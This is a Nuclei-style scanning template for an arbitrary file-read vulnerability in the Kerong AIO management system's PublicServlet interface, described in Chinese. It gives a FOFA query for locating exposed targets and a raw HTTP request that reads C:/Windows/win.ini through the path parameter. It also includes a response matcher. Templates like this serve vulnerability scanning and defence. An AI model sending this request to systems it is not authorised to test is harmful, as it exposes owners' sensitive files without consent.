id: kerong-aio-publicservlet-file-read

info:
  name: "科荣AIO管理系统 PublicServlet 接口任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="changeAccount('8000')"
          科荣AIO管理系统在PublicServlet接口实现中存在文件访问控制缺陷，攻击者可通过该接口实现未经授权的文件访问，导致系统敏感数据暴露。
  tags: 科荣AIO管理系统

http:
- raw:
  - |
    GET /PublicServlet?operation=downLoadFiles&path=C:/WIndows/win.ini&pho= HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'fonts'
